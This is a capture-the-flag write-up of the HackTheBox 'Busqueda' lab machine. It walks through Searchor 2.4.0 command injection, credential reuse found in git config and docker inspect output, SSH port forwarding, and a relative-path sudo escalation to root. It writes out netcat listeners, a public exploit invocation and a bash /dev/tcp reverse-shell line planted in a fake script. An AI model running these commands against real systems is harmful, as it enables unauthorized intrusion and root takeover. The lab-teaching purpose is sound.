---
title: "HackTheBox - Busqueda"
published: true
---

| Field            | Details                                                            |
| ---------------- | ------------------------------------------------------------------ |
| **OS**           | Linux                                                              |
| **Difficulty**   | Easy                                                               |
| **Release Date** | 2023-04-08                                                         |
| **Pwned Date**   | 2026-05-14                                                         |
| **Tags**         | `Searchor` `CVE-2023-43364` `git` `docker` `local port forwarding` |

## Summary

Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the user 'administrator' Gitea account. Further analysis of the system checkup script source code in the Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.

## Reconnaissance

Start with a general sweep of all TCP ports

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt TARGET_IP
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Try to visit http://TARGET_IP. This does not work because it's being redirected to https://searcher.htb/

Add this line to the /etc/hosts file:

```
TARGET_IP   searcher.htb
```

Now browse to https://searcher.htb/

The page present a search engine. Notice the footer:

```
Powered by Flask and Searchor 2.4.0
```

Searchor is a open source python library that simplifies generating search query URLs. Version 2.4.0 has a known exploit that allow to get a reverse shell. The search feature contains an eval() statement that is not properly sanitized so it’s possible to escape the query string and to inject an arbitraty command after it.

## Foothold

Find an existing exploit for this vulnerability at https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection and download it

Listen on the attacking machine

```bash
nc -lvnp 9001
```

```
listening on [any] 9001 ...
```

Run the exploit

```bash
./exploit.sh http://searcher.htb/ ATTACKER_IP
```

On the attacking machine's listening port a connection will be established

```
listening on [any] 9001 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.228.217] 57574
bash: cannot set terminal process group (1502): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$
```

## Privilege Escalation

The /var/www/app folder contains a .git folder, run

```bash
cd .git
git config --global --add safe.directory /var/www/app
git config --list
```

```
[snip]
remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
[snip]
```

The output provides some credentials for a gitea service: user 'cody' and password 'jh1usoih2bkjaspwe92'

Gitea is a lightweight git service

These credentials allow to access the 'cody' account on the gitea instance but they were also reused for the svc system user: run

```bash
sudo -l -S
```

Type the newly found password when prompted

```
[sudo] password for svc: jh1usoih2bkjaspwe92
```

```
User svc may run the following commands on busqueda:
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

This output shows that svc user is allowed to run the system-checkup.py as root

It's not possible to read the file content because user svc lacks permissions but it's possible to treat it like a black box and probe it

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

```
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 19 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 19 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

The gitea container found earlier is running as a docker container along with a mysql container.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```

```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

The inspect feature requires a format arg and the container name. Dump all information related to the gitea container

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
```

The output provides new credentials

```
[snip]
1. "GITEA__database__DB_TYPE=mysql",
2. "GITEA__database__HOST=db:3306",
3. "GITEA__database__NAME=gitea",
4. "GITEA__database__USER=gitea",
5. "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
[snip]
```

These would allow access to the mysql db but they were also reused for the 'administrator' account on the gitea service.

To login to the gitea web ui first it needs to be reachable: the service is only reachable on localhost. See the '127.0.0.1:3000->3000/tcp' line earlier.

Since the password for svc user was found, the gitea internal service can be exposed using local port forwarding

On the attacking machine run:

```bash
ssh -L 3000:localhost:3000 svc@searcher.htb
```

Now everything that is sent on localhost:3000 of the attacking machine will be relayed to the localhost:3000 of the target machine via a ssh tunnel. So the gitea service is accessible as if it was running on the attacker's machine.

Browse to localhost:3000 and access gitea with user 'administrator' and password 'yuiu1hoiu4i5ho1uh'.

Go to the 'scripts' repo which contains the system-checkup.py file, the file that the user svc is allowed to run as root.

The code related to the 'full-checkup' feature provides a vector for privilege escalation

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

The full-checkup.sh script is run using a relative path, so it's possible to run the system-checkup.py script from a different folder and create a malicious script with the same name (full-checkup.sh) in that folder. The system-checkup.py script will execute the malicious script instead of the intended one. If the malicious script runs a reverse shell it will grant root access to the attacker.

Listen on attacking machine

```bash
nc -lvnp 9002
```

On target machine run the following commands

```bash
cd ~    # move to user home dir
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.50/9002 0>&1\n' > full-checkup.sh # create malicious script
chmod +x full-checkup.sh    # make it executable
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup   # run it
```

These commands need to be run quickly since there is a background process that periodically deletes files from certain folders. Waiting too long will cause the malicious script to be deleted by the system.

An incoming connection should be received on the attacking machine

```
listening on [any] 9002 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.228.217] 50606
root@busqueda:/home/svc# whoami
whoami
root
```

Got root access.
